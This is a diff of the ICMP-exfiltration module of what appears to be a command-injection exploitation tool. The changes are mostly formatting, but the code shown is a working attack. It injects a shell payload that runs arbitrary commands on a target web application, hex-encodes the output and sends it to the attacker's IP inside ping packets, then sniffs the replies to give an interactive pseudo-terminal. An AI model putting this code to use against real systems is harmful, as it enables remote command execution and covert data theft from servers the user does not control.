@@ -51,34 +51,38 @@ def packet_handler(Packet):
     sys.stdout.write(Data.load[8:])
     sys.stdout.flush()
 
+
 def signal_handler(signal, frame):
   sys.exit(0)
 
-def snif(ip_dst,ip_src):
+
+def snif(ip_dst, ip_src):
   print( Style.BRIGHT + "(!) Started the sniffer between " + Fore.YELLOW + ip_src + Style.RESET_ALL + Style.BRIGHT + 
         " and " + Fore.YELLOW + ip_dst + Style.RESET_ALL + Style.BRIGHT + "." + Style.RESET_ALL)
   
   while True:
     sniff(filter = "icmp and src " + ip_dst, prn=packet_handler, timeout=settings.DELAY)
-    
-def cmd_exec(http_request_method,cmd,url,vuln_parameter,ip_src):
+ 
+
+def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
   # icmp exfiltration payload.
   payload = ('; ' + cmd + ' | xxd -p -c8 | while read line; do ping -p $line -c 1 -s16 -q ' + ip_src + '; done')
   if http_request_method == "GET":
-    url = url.replace(settings.INJECT_TAG,"")
-    data = payload.replace(" ","%20")
+    url = url.replace(settings.INJECT_TAG, "")
+    data = payload.replace(" ", "%20")
     req = url + data
   else:
     values =  {vuln_parameter:payload}
     data = urllib.urlencode(values)
-    req = urllib2.Request(url=url,data=data)
+    req = urllib2.Request(url=url, data=data)
     
   sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
   response = urllib2.urlopen(req)
   time.sleep(2)
   sys.stdout.write("\n" + Style.RESET_ALL)
 
-def input_cmd(http_request_method,url,vuln_parameter,ip_src):
+
+def input_cmd(http_request_method, url, vuln_parameter, ip_src):
   print "\nPseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
   while True:
     try:
@@ -86,7 +90,7 @@ def input_cmd(http_request_method,url,vuln_parameter,ip_src):
       if cmd == "q":
         os._exit(0)
       else: 
-        cmd_exec(http_request_method,cmd,url,vuln_parameter,ip_src)
+        cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src)
     except KeyboardInterrupt:
       print ""
       os._exit(0)
@@ -94,20 +98,21 @@ def input_cmd(http_request_method,url,vuln_parameter,ip_src):
       print ""
       os._exit(0)
 
-def exploitation(ip_dst,ip_src,url,http_request_method,vuln_parameter):
+
+def exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter):
   signal.signal(signal.SIGINT, signal_handler)
-  sniffer_thread = threading.Thread(target=snif, args=(ip_dst,ip_src,)).start()
+  sniffer_thread = threading.Thread(target=snif, args=(ip_dst, ip_src, )).start()
   time.sleep(2)
   if menu.options.os_cmd:
     cmd = menu.options.os_cmd
-    cmd_exec(http_request_method,cmd,url,vuln_parameter,ip_src)
+    cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src)
     print ""
     os._exit(0)
   else:
-    input_cmd(http_request_method,url,vuln_parameter,ip_src)
+    input_cmd(http_request_method, url, vuln_parameter, ip_src)
 
-def icmp_exfiltration_handler(url,http_request_method):
 
+def icmp_exfiltration_handler(url, http_request_method):
   # You need to have root privileges to run this script
   if os.geteuid() != 0:
     print "\n" + Back.RED + "(x) Error:  You need to have root privileges to run this option." + Style.RESET_ALL
@@ -125,7 +130,7 @@ def icmp_exfiltration_handler(url,http_request_method):
     parameter = parameters.do_POST_check(parameter)
     request = urllib2.Request(url, parameter)
     headers.do_check(request)
-    vuln_parameter = parameters.vuln_POST_param(parameter,url)
+    vuln_parameter = parameters.vuln_POST_param(parameter, url)
   
   # Check if defined any HTTP Proxy.
   if menu.options.proxy:
@@ -156,13 +161,13 @@ def icmp_exfiltration_handler(url,http_request_method):
   sys.stdout.write("(*) Testing the "+ technique + "... \n")
   sys.stdout.flush()
   
-  ip_src =  re.findall(r"ip_src=(.*),",ip_data)
+  ip_src =  re.findall(r"ip_src=(.*), ", ip_data)
   ip_src = ''.join(ip_src)
   
-  ip_dst =  re.findall(r"ip_dst=(.*)",ip_data)
+  ip_dst =  re.findall(r"ip_dst=(.*)", ip_data)
   ip_dst = ''.join(ip_dst)
   
-  exploitation(ip_dst,ip_src,url,http_request_method,vuln_parameter)
+  exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter)
 
 if __name__ == "__main__":
-  icmp_exfiltration_handler(url,http_request_method)
+  icmp_exfiltration_handler(url, http_request_method)
